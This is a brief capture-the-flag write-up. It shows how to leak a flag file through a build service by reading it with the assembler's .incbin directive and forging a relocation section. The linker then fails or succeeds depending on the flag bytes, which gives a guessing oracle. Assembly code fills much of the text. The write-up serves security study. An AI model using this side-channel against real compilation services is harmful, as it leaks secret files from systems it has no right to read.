We need to exfiltrate the flag file using nothing but compilation failure/success
as an oracle.

My solution is to read the file with assembler `.incbin` directive. Then craft a fake
relocation section to make the linker operate on flag data and conditionally fail.

In particular, we declare a symbol `guess` with a 32bit absolute value:

	.global guess
	.set guess, GUESS

Include 4 bytes of flag:

	foobar:
		.incbin "flag", OFFSET, 4

Make the linker add `guess` to the 4 bytes:

	# @9 is section type SHT_REL
	.section .rel.text, "aMo", @9, 16, .text
	.8byte 4  # offset of incbin-ed bytes
	.4byte 10 # relocation type R_X86_64_32
	.4byte 4  # symbol id of "guess"

Linking will fail if `GUESS+u32(flag[OFFSET:OFFSET+4])` won't fit in 32 bits.
That's enough to exfiltrate the flag.
